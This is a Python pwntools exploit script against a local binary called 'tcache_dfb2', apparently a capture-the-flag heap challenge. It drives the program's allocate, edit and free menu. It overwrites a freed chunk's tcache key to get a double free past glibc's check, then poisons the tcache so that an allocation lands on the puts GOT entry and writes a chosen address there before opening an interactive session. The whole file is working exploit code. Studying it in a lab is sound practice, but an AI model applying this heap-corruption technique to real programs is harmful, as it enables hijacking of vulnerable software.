from pwn import *
p = process("./tcache_dfb2")


def create(size, data):
	print p.sendlineafter(">", "1")
	print p.sendlineafter(":", str(size))
	print p.sendlineafter(":", str(data))


def modify(idx, size, data):
	print p.sendlineafter(">", "2")
	print p.sendlineafter(":", str(idx))
	print p.sendlineafter(":", str(size))
	print p.sendafter(":", str(data))


def delete(idx):
	print p.sendlineafter(">", "3")
	print p.sendlineafter(":", str(idx))


puts_got = 0x404020
create(0x10, "AAAA")
create(0x10, "AAAA")
create(0x10, "AAAA")
delete(0)
delete(1)
delete(2)
modify(2, 0x10, "A"*8 + "IT'S KEY")
delete(2)
create(0x10, p64(puts_got))
create(0x10, "AAAA")
create(0x10, p64(0x0000000000401530))
p.interactive()
